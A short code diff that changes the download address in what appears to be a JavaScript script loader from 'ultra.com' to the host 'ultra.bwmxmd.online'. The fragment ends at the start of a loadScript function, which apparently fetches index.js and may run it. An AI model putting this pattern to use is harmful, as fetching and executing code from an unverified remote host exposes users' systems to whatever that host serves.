@@ -1,7 +1,7 @@
 const axios = require('axios');
 
 const scriptName = 'index.js';
-const scriptUrl = `https://ultra.com/${scriptName}`;
+const scriptUrl = `https://ultra.bwmxmd.online/${scriptName}`;
 
 async function loadScript() {
     try {
